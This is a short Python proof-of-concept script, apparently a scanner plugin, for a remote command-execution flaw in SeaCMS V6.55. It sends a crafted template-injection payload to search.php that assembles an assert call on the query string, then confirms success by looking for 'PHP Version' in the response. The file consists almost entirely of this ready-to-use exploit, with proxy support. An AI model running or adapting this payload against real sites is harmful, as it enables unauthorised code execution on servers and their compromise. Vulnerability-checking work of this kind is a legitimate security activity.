import requests
import random

# seacms V6.55 命令执行
def poc(url, logindict, user_agent, proxy):
    url = url.strip("/")
    header = {
        'User-Agent': user_agent,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # 漏洞位置
    exploit_url = url + '/search.php'
    datas = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/"
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exploit_url, headers=header, data=datas, proxies=proxies)

    else:
        response = requests.post(exploit_url, data=datas, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code == 200:
        if 'PHP Version' in response.text:
            return 'seacms V6.55 - 命令执行 '

def run(url, logindict, user_agent, proxies):
    result = poc(url, logindict, user_agent, proxies)
    return result

# run("http://127.0.0.1/seacms6.54/",{'admin':'admin'},'','')

